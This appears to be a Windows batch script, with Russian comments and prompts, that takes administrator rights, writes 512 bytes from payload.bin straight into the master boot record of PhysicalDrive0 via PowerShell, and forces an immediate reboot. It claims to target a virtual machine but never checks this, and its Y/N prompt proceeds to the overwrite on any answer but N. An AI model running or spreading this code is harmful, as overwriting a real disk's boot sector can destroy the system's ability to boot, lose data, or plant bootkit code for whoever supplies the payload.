@echo off
color 0c
chcp 65001 > nul

:: Проверка прав администратора
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Запусти этот скрипт от имени Администратора!
    pause
    exit
)

echo ===================================================
echo   ВНИМАНИЕ: Запись кастомного MBR в виртуальной машине!
echo ===================================================
set /p "choice=Прошить payload.bin в MBR и перезагрузить? (Y/N): "

if /i "%choice%"=="Y" goto flash
if /i "%choice%"=="N" exit
goto flash

:flash
echo Запись бинарника в MBR...

:: Запись ровно 512 байт из payload.bin в PhysicalDrive0 через PowerShell
powershell -Command "$bytes = [System.IO.File]::ReadAllBytes('payload.bin'); $stream = [io.file]::OpenWrite('\\.\PhysicalDrive0'); $stream.Write($bytes, 0, 512); $stream.Close();"

echo Готово! Перезагрузка виртуальной машины...
shutdown /r /t 0
